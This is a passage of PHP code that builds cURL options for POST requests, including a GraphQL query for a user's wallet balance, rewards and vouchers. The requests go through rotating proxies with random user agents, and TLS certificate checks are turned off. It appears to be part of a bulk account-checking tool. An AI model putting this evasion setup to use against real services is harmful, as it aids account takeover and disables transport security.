                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POSTFIELDS => '{"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"}',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            }
        }
    } elseif ($status == 'hide') {
        if (file_exists($config['serverorip_proxy'])) {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_POSTFIELDS => '',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_POSTFIELDS => '',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            }
        } else {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POSTFIELDS => '',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_POST => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POSTFIELDS => '',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                ];
            }
        }
    } else {
        if (file_exists($config['serverorip_proxy'])) {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_FRESH_CONNECT => true,
                    CURLOPT_COOKIEJAR => 'cookie.txt',
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($postdata),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_FRESH_CONNECT => true,
                    CURLOPT_COOKIEJAR => 'cookie.txt',
                    CURLOPT_PROXY => getNextProxy($config['serverorip_proxy']),
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($postdata),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                ];
            }
        } else {
            if ($config['proxy_auth']) {
                $curloptionsn = [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_FRESH_CONNECT => true,
                    CURLOPT_COOKIEJAR => 'cookie.txt',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($postdata),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                    CURLOPT_PROXYUSERPWD => $config['proxyuser'],
                ];
            } else {
                $curloptionsn = [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_FRESH_CONNECT => true,
                    CURLOPT_COOKIEJAR => 'cookie.txt',
                    CURLOPT_PROXY => $config['serverorip_proxy'],
                    CURLOPT_PROXYTYPE => $type,
                    CURLOPT_TIMEOUT => $config['timeout'],
                    CURLOPT_CONNECTTIMEOUT => $config['connectiontimeout'],
                    // CURLOPT_SSL_CIPHER_LIST => 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-SHA',
                    CURLOPT_HTTPHEADER => $header,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($postdata),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => $fitur->generateua(),
                    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,
                ];
            }
        }
    }

    return $curloptionsn;
}
/* [ CHECKING CONFIGURATION ] */
